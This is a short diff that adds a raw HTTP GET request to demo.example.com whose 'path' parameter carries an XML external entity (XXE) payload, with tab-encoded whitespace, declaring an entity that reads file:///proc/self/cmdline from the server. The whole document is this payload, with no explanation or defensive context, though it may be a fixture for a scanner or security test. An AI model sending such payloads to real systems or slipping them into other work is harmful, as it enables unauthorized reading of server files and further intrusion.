@@ -1,0 +1,4 @@
+GET /a?path=<!DOCTYPE%09r%09[<!ENTITY%09xxe%09SYSTEM%09"file:///proc/self/cmdline">]><r>%26xxe;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
